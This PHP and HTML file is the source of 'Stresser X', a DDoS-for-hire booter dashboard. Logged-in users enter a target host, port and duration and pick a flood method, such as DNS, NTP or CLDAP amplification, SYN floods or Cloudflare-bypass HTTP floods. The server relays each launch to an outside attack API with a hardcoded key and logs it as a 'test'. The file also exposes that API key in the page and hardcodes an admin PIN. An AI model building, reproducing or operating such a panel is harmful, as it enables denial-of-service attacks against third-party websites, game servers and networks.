<?php
session_start();
require_once __DIR__ . '/vendor/autoload.php';

// Database configuration (replace with your PlanetScale credentials)
$host = getenv('MYSQL_HOST') ?: 'your-planetscale-host';
$dbname = getenv('MYSQL_DATABASE') ?: 'stresser_db';
$user = getenv('MYSQL_USER') ?: 'your-planetscale-user';
$pass = getenv('MYSQL_PASSWORD') ?: 'your-planetscale-password';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);
} catch (PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}

// Initialize visit counter
$stmt = $pdo->query("SELECT value FROM counters WHERE name = 'visits'");
$visits = $stmt->fetchColumn() ?: 0;
$pdo->exec("INSERT INTO counters (name, value) VALUES ('visits', 0) ON DUPLICATE KEY UPDATE value = value + 1");
$visits++;

// Handle login
$error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = $_POST['password'];
    if ($username && $password) {
        $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
        $stmt->execute([$username]);
        $user = $stmt->fetch();
        if ($user && password_verify($password, $user['password'])) {
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['username'] = $user['username'];
            $_SESSION['is_admin'] = $user['is_admin'];
            header('Location: /');
            exit;
        } else {
            $error = 'Invalid username or password';
        }
    } else {
        $error = 'All fields are required';
    }
}

// Handle admin PIN verification
$admin_error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_pin'])) {
    $pin = $_POST['admin_pin'];
    if ($pin === 'X7P9Q2') { // Hardcoded for demo
        $_SESSION['admin_verified'] = true;
        header('Location: /');
        exit;
    } else {
        $admin_error = 'Invalid PIN';
    }
}

// Handle attack submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['start_test'])) {
    if (!isset($_SESSION['user_id'])) {
        $error = 'Please log in to start a test';
    } else {
        $host = filter_input(INPUT_POST, 'host', FILTER_SANITIZE_URL);
        $port = filter_input(INPUT_POST, 'port', FILTER_VALIDATE_INT);
        $time = filter_input(INPUT_POST, 'time', FILTER_VALIDATE_INT);
        $concs = filter_input(INPUT_POST, 'concs', FILTER_VALIDATE_INT);
        $method = filter_input(INPUT_POST, 'method', FILTER_SANITIZE_STRING);
        
        if ($host && $port >= 1 && $port <= 65535 && $time >= 1 && $time <= 200 && $concs >= 1 && $concs <= 4 && $method) {
            $stmt = $pdo->prepare("INSERT INTO attack_history (user_id, host, port, duration, method, status) VALUES (?, ?, ?, ?, ?, 'Pending')");
            $stmt->execute([$_SESSION['user_id'], $host, $port, $time, $method]);
            // Simulate API call (replace with real API)
            $api_key = '56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a';
            $api_url = "https://api.allorigins.win/raw?url=" . urlencode("https://api.santastress.ru/api/start?key=$api_key&host=" . urlencode($host) . "&port=$port&time=$time&method=" . urlencode($method) . "&concs=$concs");
            $response = file_get_contents($api_url);
            $status = json_decode($response) ? 'Completed' : 'Failed';
            $pdo->prepare("UPDATE attack_history SET status = ? WHERE id = ?")->execute([$status, $pdo->lastInsertId()]);
        } else {
            $error = 'Invalid test parameters';
        }
    }
}

// Fetch attack history
$history = [];
if (isset($_SESSION['user_id'])) {
    $stmt = $pdo->prepare("SELECT * FROM attack_history WHERE user_id = ? ORDER BY created_at DESC LIMIT 10");
    $stmt->execute([$_SESSION['user_id']]);
    $history = $stmt->fetchAll();
}

// Admin data
$admin_users = [];
$active_users = 0;
if (isset($_SESSION['admin_verified']) && $_SESSION['admin_verified']) {
    $stmt = $pdo->query("SELECT id, username, is_active FROM users");
    $admin_users = $stmt->fetchAll();
    $active_users = $pdo->query("SELECT COUNT(*) FROM users WHERE is_active = 1")->fetchColumn();
}

?>
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;">
    <title>Stresser X - Advanced Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/snowstorm/20131208/snowstorm-min.js"></script>
    <style>
        :root {
            --primary-bg: #0a0e14;
            --panel-bg: #1c2526;
            --accent: #00d4ff;
            --accent-hover: #00eaff;
            --text: #d1d5db;
            --text-secondary: #9ca3af;
            --border: #374151;
            --shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
            --success: #22c55e;
            --error: #ef4444;
            --warning: #eab308;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, var(--primary-bg) 0%, #1f2937 100%);
            color: var(--text);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 2rem;
            overflow-x: hidden;
            position: relative;
        }

        .container {
            max-width: 1600px;
            width: 100%;
            display: grid;
            grid-template-columns: 2.5fr 1fr;
            gap: 3rem;
            position: relative;
            z-index: 1;
        }

        .panel {
            background: var(--panel-bg);
            border-radius: 20px;
            padding: 2.5rem;
            box-shadow: var(--shadow);
            transition: transform 0.3s ease, opacity 0.3s ease;
            position: relative;
            overflow: hidden;
            max-width: 600px;
            margin: 0 auto;
        }

        .panel::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 6px;
            background: linear-gradient(90deg, var(--accent), transparent);
        }

        h1 {
            font-size: 2.5rem;
            font-weight: 700;
            color: var(--accent);
            margin-bottom: 2rem;
            text-align: center;
            letter-spacing: 0.8px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }

        h2 {
            font-size: 1.8rem;
            font-weight: 600;
            color: var(--accent);
            margin-bottom: 1.5rem;
            text-transform: uppercase;
        }

        .hidden {
            display: none;
            opacity: 0;
            transform: translateY(30px);
        }

        .tabs {
            display: flex;
            gap: 1.2rem;
            margin-bottom: 2rem;
            justify-content: center;
            flex-wrap: wrap;
            background: rgba(0, 0, 0, 0.3);
            padding: 0.8rem;
            border-radius: 12px;
        }

        .tab {
            padding: 0.9rem 2.2rem;
            background: var(--border);
            color: var(--text);
            border-radius: 10px;
            cursor: pointer;
            font-weight: 500;
            font-size: 1.1rem;
            transition: all 0.3s ease;
            position: relative;
        }

        .tab::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0;
            height: 3px;
            background: var(--accent);
            transition: width 0.3s ease;
        }

        .tab:hover::after {
            width: 100%;
        }

        .tab.active {
            background: var(--accent);
            color: #fff;
            transform: translateY(-3px);
            box-shadow: 0 4px 12px rgba(0, 212, 255, 0.3);
        }

        .tab:hover {
            background: var(--accent-hover);
            color: #fff;
            transform: translateY(-3px);
        }

        .form-group {
            margin-bottom: 1.8rem;
            position: relative;
        }

        label {
            font-size: 1rem;
            font-weight: 500;
            color: var(--text-secondary);
            margin-bottom: 0.8rem;
            display: block;
            transition: color 0.3s ease;
        }

        input, select {
            width: 100%;
            padding: 1.2rem;
            border: 1px solid var(--border);
            border-radius: 12px;
            font-size: 1rem;
            color: var(--text);
            background: #2d3748;
            transition: all 0.3s ease;
        }

        input:focus, select:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 4px rgba(0, 212, 255, 0.2);
            background: #374151;
        }

        select {
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%2300d4ff' viewBox='0 0 24 24'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 1.2rem center;
            background-size: 1.4rem;
        }

        button {
            width: 100%;
            padding: 1.2rem;
            background: var(--accent);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.2rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: 0.5s;
        }

        button:hover::before {
            left: 100%;
        }

        button:hover {
            transform: scale(1.05);
            background: var(--accent-hover);
            box-shadow: 0 6px 20px rgba(0, 212, 255, 0.4);
        }

        .error-message {
            text-align: center;
            font-size: 1rem;
            margin-top: 1.5rem;
            color: var(--error);
            font-weight: 500;
            transition: opacity 0.3s ease;
        }

        .sidebar {
            background: var(--panel-bg);
            padding: 2.5rem;
            border-radius: 16px;
            box-shadow: var(--shadow);
            position: sticky;
            top: 2rem;
            animation: slideIn 0.5s ease-in-out;
        }

        .sidebar p {
            margin-bottom: 1.2rem;
            font-size: 1rem;
            color: var(--text-secondary);
            line-height: 1.6;
        }

        #attackTimer {
            font-size: 2rem;
            font-weight: 700;
            color: var(--accent);
            margin-top: 1.5rem;
            text-align: center;
        }

        .progress-bar {
            width: 100%;
            height: 14px;
            background: var(--border);
            border-radius: 8px;
            overflow: hidden;
            margin-top: 1.2rem;
        }

        .progress-bar div {
            height: 100%;
            background: linear-gradient(90deg, var(--accent), var(--accent-hover));
            transition: width 0.7s ease-in-out;
        }

        .admin-content {
            padding: 2rem;
            background: #2d3748;
            border-radius: 12px;
            margin-top: 1.5rem;
        }

        .admin-content table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 1.5rem;
        }

        .admin-content th, .admin-content td {
            padding: 1.2rem;
            text-align: left;
            border-bottom: 1px solid var(--border);
            font-size: 1rem;
        }

        .admin-content th {
            color: var(--accent);
            font-weight: 600;
            text-transform: uppercase;
        }

        .admin-content td button {
            padding: 0.6rem 1.2rem;
            font-size: 0.95rem;
        }

        .tab-content {
            animation: fadeIn 0.5s ease-in-out;
        }

        .overview-content, .history-content, .settings-content {
            padding: 2rem;
            background: #2d3748;
            border-radius: 12px;
            margin-top: 1.5rem;
        }

        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 0.6rem;
        }

        .status-active { background: var(--success); }
        .status-inactive { background: var(--error); }
        .status-operational { background: var(--success); }
        .status-maintenance { background: var(--warning); }

        .tooltip {
            position: relative;
        }

        .tooltip .tooltip-text {
            visibility: hidden;
            width: 220px;
            background: var(--panel-bg);
            color: var(--text);
            text-align: center;
            padding: 0.6rem;
            border-radius: 8px;
            position: absolute;
            z-index: 1;
            bottom: 125%;
            left: 50%;
            transform: translateX(-50%);
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .tooltip:hover .tooltip-text {
            visibility: visible;
            opacity: 1;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--panel-bg);
            color: var(--text);
            padding: 1rem;
            border-radius: 8px;
            box-shadow: var(--shadow);
            z-index: 1000;
            animation: slideInRight 0.5s ease-in-out;
            display: none;
        }

        .notification.success { border-left: 4px solid var(--success); }
        .notification.error { border-left: 4px solid var(--error); }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateX(40px); }
            to { opacity: 1; transform: translateX(0); }
        }

        @keyframes slideInRight {
            from { opacity: 0; transform: translateX(100%); }
            to { opacity: 1; transform: translateX(0); }
        }

        .dark-mode-toggle {
            position: fixed;
            top: 20px;
            left: 20px;
            background: var(--accent);
            color: #fff;
            padding: 0.8rem;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .dark-mode-toggle:hover {
            background: var(--accent-hover);
        }

        .visit-counter {
            text-align: center;
            font-size: 1.2rem;
            color: var(--accent);
            margin-top: 2rem;
            font-weight: 600;
        }

        .loading-spinner {
            display: none;
            border: 4px solid var(--border);
            border-top: 4px solid var(--accent);
            border-radius: 50%;
            width: 28px;
            height: 28px;
            animation: spin 1s linear infinite;
            margin: 1.5rem auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 1200px) {
            .container {
                grid-template-columns: 1fr;
                gap: 2.5rem;
            }
            .sidebar {
                position: static;
            }
        }

        @media (max-width: 768px) {
            .tabs {
                flex-direction: column;
                align-items: center;
            }
            .tab {
                width: 100%;
                text-align: center;
                padding: 0.8rem;
            }
            .panel {
                padding: 2rem;
            }
            input, select, button {
                font-size: 0.95rem;
                padding: 1rem;
            }
            h1 {
                font-size: 2rem;
            }
            h2 {
                font-size: 1.5rem;
            }
        }

        @media (max-width: 480px) {
            .panel {
                padding: 1.5rem;
            }
            .tabs {
                gap: 0.6rem;
            }
            .tab {
                padding: 0.7rem;
                font-size: 0.95rem;
            }
        }
    </style>
</head>
<body onload="snowStorm.start()">
    <div class="dark-mode-toggle" onclick="toggleDarkMode()">Toggle Dark Mode</div>
    <div class="container">
        <div class="main-content">
            <?php if (!isset($_SESSION['user_id'])): ?>
                <div id="loginPanel" class="panel">
                    <h1>Stresser X - Login</h1>
                    <form method="POST">
                        <div class="form-group">
                            <label for="username">Username</label>
                            <input type="text" id="username" name="username" placeholder="Enter username" required>
                        </div>
                        <div class="form-group">
                            <label for="password">Password</label>
                            <input type="password" id="password" name="password" placeholder="Enter password" required>
                        </div>
                        <button type="submit" name="login">Log In</button>
                    </form>
                    <p class="error-message"><?php echo $error; ?></p>
                    <p class="visit-counter">Total Visits: <span id="visitCount"><?php echo $visits; ?></span></p>
                </div>
                <div id="adminLoginPanel" class="panel hidden">
                    <h1>Admin Access</h1>
                    <form method="POST">
                        <div class="form-group">
                            <label for="adminPin">PIN</label>
                            <input type="password" id="adminPin" name="admin_pin" placeholder="Enter 6-character PIN" maxlength="6" required>
                        </div>
                        <button type="submit">Verify PIN</button>
                    </form>
                    <p class="error-message"><?php echo $admin_error; ?></p>
                </div>
            <?php else: ?>
                <div id="mainPanel" class="panel">
                    <h1>Stresser X Dashboard</h1>
                    <div class="tabs">
                        <button id="tab-overview" class="tab active tooltip">Overview<span class="tooltip-text">View dashboard overview</span></button>
                        <button id="tab-layer7" class="tab tooltip">Layer 7<span class="tooltip-text">Configure Layer 7 tests</span></button>
                        <button id="tab-layer4" class="tab tooltip">Layer 4<span class="tooltip-text">Configure Layer 4 tests</span></button>
                        <button id="tab-history" class="tab tooltip">History<span class="tooltip-text">View test history</span></button>
                        <button id="tab-settings" class="tab tooltip">Settings<span class="tooltip-text">Manage user settings</span></button>
                        <button id="tab-admin" class="tab tooltip">Admin<span class="tooltip-text">Access admin controls</span></button>
                    </div>
                    <div id="overview" class="tab-content overview-content">
                        <h2>Overview</h2>
                        <p>Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?>!</p>
                        <p>Active Tests: <span id="activeAttacks">0</span></p>
                        <p>User Plan: <span id="userPlan">Bronze</span></p>
                        <p>Last Login: <span id="lastLogin"><?php echo date('Y-m-d H:i:s'); ?></span></p>
                        <p>System Status: <span class="status-indicator status-operational"></span> <span id="systemStatus">Operational</span></p>
                        <div class="overview-stats">
                            <p>Total Tests Run: <span id="totalTests"><?php echo count($history); ?></span></p>
                            <p>Success Rate: <span id="successRate"><?php echo count($history) > 0 ? round((count(array_filter($history, fn($h) => $h['status'] === 'Completed')) / count($history)) * 100) : 100; ?>%</span></p>
                        </div>
                    </div>
                    <div id="layer7" class="tab-content hidden">
                        <h2>Layer 7 Test</h2>
                        <form method="POST">
                            <div class="form-group">
                                <label for="hostL7">Host (URL or IP)</label>
                                <input type="text" id="hostL7" name="host" placeholder="e.g., example.com or 192.168.1.1" required>
                            </div>
                            <div class="form-group">
                                <label for="portL7">Port</label>
                                <input type="number" id="portL7" name="port" placeholder="e.g., 80" min="1" max="65535" required>
                            </div>
                            <div class="form-group">
                                <label for="timeL7">Duration (1-200s)</label>
                                <input type="number" id="timeL7" name="time" min="1" max="200" value="60" required>
                            </div>
                            <div class="form-group">
                                <label for="concsL7">Concurrent Connections (1-4)</label>
                                <input type="number" id="concsL7" name="concs" min="1" max="4" value="1" required>
                            </div>
                            <div class="form-group">
                                <label for="methodL7">Method</label>
                                <select id="methodL7" name="method" required>
                                    <option value="httpsbypass">HTTPS Bypass</option>
                                    <option value="cloudflare">Cloudflare</option>
                                    <option value="browser">Browser</option>
                                    <option value="priv-flood">Private Flood</option>
                                </select>
                            </div>
                            <button type="submit" name="start_test">Start Test</button>
                        </form>
                        <div class="loading-spinner" id="spinnerL7"></div>
                    </div>
                    <div id="layer4" class="tab-content hidden">
                        <h2>Layer 4 Test</h2>
                        <form method="POST">
                            <div class="form-group">
                                <label for="hostL4">Host (URL or IP)</label>
                                <input type="text" id="hostL4" name="host" placeholder="e.g., example.com or 192.168.1.1" required>
                            </div>
                            <div class="form-group">
                                <label for="portL4">Port</label>
                                <input type="number" id="portL4" name="port" placeholder="e.g., 80" min="1" max="65535" required>
                            </div>
                            <div class="form-group">
                                <label for="timeL4">Duration (1-200s)</label>
                                <input type="number" id="timeL4" name="time" min="1" max="200" value="60" required>
                            </div>
                            <div class="form-group">
                                <label for="concsL4">Concurrent Connections (1-4)</label>
                                <input type="number" id="concsL4" name="concs" min="1" max="4" value="1" required>
                            </div>
                            <div class="form-group">
                                <label for="methodL4">Method</label>
                                <select id="methodL4" name="method" required>
                                    <option value="dnsamp">DNS Amplification</option>
                                    <option value="ntpd">NTP Amplification</option>
                                    <option value="cldap">CLDAP Amplification</option>
                                    <option value="wsdd">Web Services Discovery</option>
                                    <option value="ssdp">SSDP Amplification</option>
                                    <option value="stun">STUN Amplification</option>
                                    <option value="ard">Apple Remote Desktop</option>
                                    <option value="mixamp">Mixed Amplification</option>
                                    <option value="udpflood">UDP Flood</option>
                                    <option value="udppulse">UDP High PPS</option>
                                    <option value="udpbyass">UDP Based</option>
                                    <option value="gamemix">Game-Mix</option>
                                    <option value="synbypass">TCP SYN Flood</option>
                                    <option value="ackbypass">TCP ACK Flood</option>
                                    <option value="tcpcookie">TCP Cookie Flood</option>
                                    <option value="ovhudp">3-Way RAW Handshake</option>
                                    <option value="openvpn">OpenVPN Flood</option>
                                    <option value="raknet">RakeNet Query</option>
                                    <option value="discord">Discord Optimized</option>
                                    <option value="tsn">TeamSpeak Query</option>
                                    <option value="icmp">FiveM Echo</option>
                                </select>
                            </div>
                            <button type="submit" name="start_test">Start Test</button>
                        </form>
                        <div class="loading-spinner" id="spinnerL4"></div>
                    </div>
                    <div id="history" class="tab-content hidden history-content">
                        <h2>Test History</h2>
                        <table>
                            <thead>
                                <tr><th>Date</th><th>Host</th><th>Method</th><th>Status</th></tr>
                            </thead>
                            <tbody>
                                <?php foreach ($history as $entry): ?>
                                    <tr>
                                        <td><?php echo htmlspecialchars($entry['created_at']); ?></td>
                                        <td><?php echo htmlspecialchars($entry['host']); ?></td>
                                        <td><?php echo htmlspecialchars($entry['method']); ?></td>
                                        <td><span class="status-indicator status-<?php echo strtolower($entry['status']); ?>"></span><?php echo htmlspecialchars($entry['status']); ?></td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                    <div id="settings" class="tab-content hidden settings-content">
                        <h2>Settings</h2>
                        <div class="form-group">
                            <label for="themeToggle">Theme</label>
                            <select id="themeToggle">
                                <option value="dark">Dark</option>
                                <option value="light">Light</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="apiKey">API Key</label>
                            <input type="text" id="apiKey" value="56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a" readonly>
                        </div>
                        <div class="form-group">
                            <label for="notificationToggle">Notifications</label>
                            <select id="notificationToggle">
                                <option value="on">On</option>
                                <option value="off">Off</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="languageSelect">Language</label>
                            <select id="languageSelect">
                                <option value="pl">Polski</option>
                                <option value="en">English</option>
                            </select>
                        </div>
                        <button onclick="saveSettings()">Save Settings</button>
                        <button onclick="resetForms()">Reset Settings</button>
                    </div>
                    <div id="admin" class="tab-content hidden">
                        <?php if (isset($_SESSION['admin_verified']) && $_SESSION['admin_verified']): ?>
                            <div id="adminContent" class="admin-content">
                                <h2>Admin Panel</h2>
                                <p>User Management</p>
                                <table>
                                    <thead>
                                        <tr><th>ID</th><th>Username</th><th>Status</th><th>Actions</th></tr>
                                    </thead>
                                    <tbody>
                                        <?php foreach ($admin_users as $user): ?>
                                            <tr>
                                                <td><?php echo htmlspecialchars($user['id']); ?></td>
                                                <td><?php echo htmlspecialchars($user['username']); ?></td>
                                                <td><span class="status-indicator status-<?php echo $user['is_active'] ? 'active' : 'inactive'; ?>"></span><?php echo $user['is_active'] ? 'Active' : 'Inactive'; ?></td>
                                                <td><button onclick="toggleUserStatus('<?php echo $user['id']; ?>')"><?php echo $user['is_active'] ? 'Deactivate' : 'Activate'; ?></button></td>
                                            </tr>
                                        <?php endforeach; ?>
                                    </tbody>
                                </table>
                                <p>Server Status: <span class="status-indicator status-operational"></span> <span id="serverStatus">Operational</span></p>
                                <p>Active Users: <span id="activeUsers"><?php echo $active_users; ?></span></p>
                                <button onclick="refreshAdminData()">Refresh Data</button>
                            </div>
                        <?php else: ?>
                            <div id="adminLoginPanel" class="admin-content">
                                <h2>Admin Access</h2>
                                <form method="POST">
                                    <div class="form-group">
                                        <label for="adminPin">PIN</label>
                                        <input type="password" id="adminPin" name="admin_pin" placeholder="Enter 6-character PIN" maxlength="6" required>
                                    </div>
                                    <button type="submit">Verify PIN</button>
                                </form>
                                <p class="error-message"><?php echo $admin_error; ?></p>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            <?php endif; ?>
        </div>
        <div id="attackPanel" class="sidebar hidden">
            <h2>Test Status</h2>
            <p><strong>Host:</strong> <span id="attackHost"></span></p>
            <p><strong>Port:</strong> <span id="attackPort"></span></p>
            <p><strong>Duration:</strong> <span id="attackTime"></span></p>
            <p><strong>Method:</strong> <span id="attackMethod"></span></p>
            <p><strong>Connections:</strong> <span id="attackConcs"></span></p>
            <p><strong>Remaining:</strong> <span id="attackTimer"></span></p>
            <div class="progress-bar"><div id="progressBar"></div></div>
        </div>
    </div>
    <div class="notification" id="notification"></div>
    <script>
        let attackInterval = null;

        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.style.display = 'block';
            setTimeout(() => notification.style.display = 'none', 3000);
        }

        function switchTab(tab) {
            ['overview', 'layer7', 'layer4', 'history', 'settings', 'admin'].forEach(t => {
                const tabBtn = document.getElementById(`tab-${t}`);
                const content = document.getElementById(t);
                if (tabBtn && content) {
                    tabBtn.classList.toggle('active', t === tab);
                    content.classList.toggle('hidden', t !== tab);
                }
            });
            if (tab === 'admin' && !<?php echo json_encode(isset($_SESSION['admin_verified']) && $_SESSION['admin_verified']); ?>) {
                document.getElementById('adminLoginPanel').classList.remove('hidden');
                document.getElementById('adminContent')?.classList.add('hidden');
            }
        }

        function startAttack(host, port, time, method, concs) {
            const spinner = document.getElementById(`spinner${method.startsWith('http') ? 'L7' : 'L4'}`);
            spinner.style.display = 'block';
            setTimeout(() => spinner.style.display = 'none', 1000); // Simulate API delay
            document.getElementById('attackHost').textContent = host;
            document.getElementById('attackPort').textContent = port;
            document.getElementById('attackTime').textContent = time + 's';
            document.getElementById('attackMethod').textContent = method;
            document.getElementById('attackConcs').textContent = concs;
            let remaining = time;
            document.getElementById('attackTimer').textContent = remaining + 's';
            const progressBar = document.getElementById('progressBar');
            document.getElementById('attackPanel').classList.remove('hidden');
            if (attackInterval) clearInterval(attackInterval);
            attackInterval = setInterval(() => {
                remaining--;
                document.getElementById('attackTimer').textContent = remaining + 's';
                progressBar.style.width = `${(remaining / time) * 100}%`;
                if (remaining <= 0) {
                    clearInterval(attackInterval);
                    attackInterval = null;
                    document.getElementById('attackPanel').classList.add('hidden');
                    progressBar.style.width = '0%';
                    showNotification('Test completed', 'success');
                }
            }, 1000);
            document.getElementById('activeAttacks').textContent = parseInt(document.getElementById('activeAttacks').textContent) + 1;
        }

        function toggleUserStatus(userId) {
            fetch('/api/admin.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'toggle_status', user_id: userId })
            })
            .then(res => res.json())
            .then(data => {
                showNotification(data.message, data.success ? 'success' : 'error');
                if (data.success) location.reload();
            });
        }

        function refreshAdminData() {
            fetch('/api/admin.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'refresh' })
            })
            .then(res => res.json())
            .then(data => {
                showNotification(data.message, data.success ? 'success' : 'error');
                if (data.success) location.reload();
            });
        }

        function saveSettings() {
            const theme = document.getElementById('themeToggle').value;
            const notifications = document.getElementById('notificationToggle').value;
            const language = document.getElementById('languageSelect').value;
            localStorage.setItem('theme', theme);
            localStorage.setItem('notifications', notifications);
            localStorage.setItem('language', language);
            showNotification('Settings saved', 'success');
            if (theme === 'light') {
                document.documentElement.style.setProperty('--primary-bg', '#f3f4f6');
                document.documentElement.style.setProperty('--panel-bg', '#ffffff');
                document.documentElement.style.setProperty('--text', '#1f2937');
                document.documentElement.style.setProperty('--text-secondary', '#6b7280');
            } else {
                document.documentElement.style.setProperty('--primary-bg', '#0a0e14');
                document.documentElement.style.setProperty('--panel-bg', '#1c2526');
                document.documentElement.style.setProperty('--text', '#d1d5db');
                document.documentElement.style.setProperty('--text-secondary', '#9ca3af');
            }
        }

        function resetForms() {
            document.querySelectorAll('form').forEach(form => form.reset());
            showNotification('Forms reset', 'success');
        }

        function toggleDarkMode() {
            const theme = localStorage.getItem('theme') === 'light' ? 'dark' : 'light';
            document.getElementById('themeToggle').value = theme;
            saveSettings();
        }

        document.addEventListener('DOMContentLoaded', () => {
            ['overview', 'layer7', 'layer4', 'history', 'settings', 'admin'].forEach(tab => {
                document.getElementById(`tab-${tab}`)?.addEventListener('click', () => switchTab(tab));
            });
            const savedTheme = localStorage.getItem('theme') || 'dark';
            document.getElementById('themeToggle').value = savedTheme;
            saveSettings();
            setInterval(() => {
                const status = Math.random() > 0.1 ? 'Operational' : 'Maintenance';
                const statusEl = document.getElementById('serverStatus');
                if (statusEl) {
                    statusEl.textContent = status;
                    const indicator = statusEl.previousElementSibling;
                    if (indicator && indicator.classList.contains('status-indicator')) {
                        indicator.className = `status-indicator status-${status.toLowerCase()}`;
                    }
                }
            }, 30000);
            document.querySelectorAll('input[type="number"]').forEach(input => {
                input.addEventListener('input', () => {
                    if (input.value < input.min || input.value > input.max) {
                        input.style.borderColor = 'var(--error)';
                    } else {
                        input.style.borderColor = 'var(--border)';
                    }
                });
            });
            document.addEventListener('keydown', e => {
                if (e.ctrlKey && e.key === 'l') document.getElementById('username')?.focus();
                if (e.ctrlKey && e.key === 't') switchTab('layer7');
            });
        });
    </script>
</body>
</html>